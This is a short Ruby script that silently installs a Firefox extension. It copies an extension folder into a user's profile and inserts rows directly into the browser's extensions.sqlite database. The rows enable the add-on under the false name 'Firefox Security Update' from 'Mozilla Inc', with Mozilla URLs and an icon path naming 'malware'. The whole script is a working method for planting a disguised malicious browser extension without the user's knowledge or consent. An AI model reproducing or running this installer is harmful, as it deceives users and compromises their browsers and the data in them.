require "fileutils"
require "sqlite3"
##Script to install an extension silently in Firefox

profileFolder="/home/nemo/.mozilla/firefox/ty1omu62.Default/"
FileUtils.cp_r("{756761cf-1b32-42ef-8d29-70f08cb96ff2}",profileFolder+"/extensions/")
#Extension copied

syncGUID=(0...12).map{ ('a'..'z').to_a[rand(26)] }.join

#Open the sqlite database
db = SQLite3::Database.new profileFolder+"/extensions.sqlite"
db.execute 'INSERT INTO locale VALUES (null,"Firefox Security Update","Firefox Updates","Mozilla Inc","http://www.mozilla.org/en-US/firefox/new/")'
p "Step 1 done"
locale_id=db.last_insert_row_id
db.execute 'INSERT INTO addon VALUES (null,"{756761cf-1b32-42ef-8d29-70f08cb96ff2}","'+syncGUID+'","app-profile","1.5.2","extension",null,"http://www.mozilla.org/en-US/firefox/new/?id={756761cf-1b32-42ef-8d29-70f08cb96ff2}",null,null,null,null,"chrome://malware/content/firefox.png",null,'+locale_id.to_s+',1,1,0,0,0,"'+profileFolder+'/extensions/{756761cf-1b32-42ef-8d29-70f08cb96ff2}",1347298747604,1347298747604,1,0,0,7130,null,null,0,1,0,0)'
p "Step 2 done" 
addon_id=db.last_insert_row_id
db.execute 'INSERT INTO targetApplication VALUES ("'+addon_id.to_s+ '","{ec8030f7-c20a-464f-9b0e-13a3a9e97384}","3.5.*","23.0a1")'
p "Step 3 done"
puts "Extension installed in Firefox"
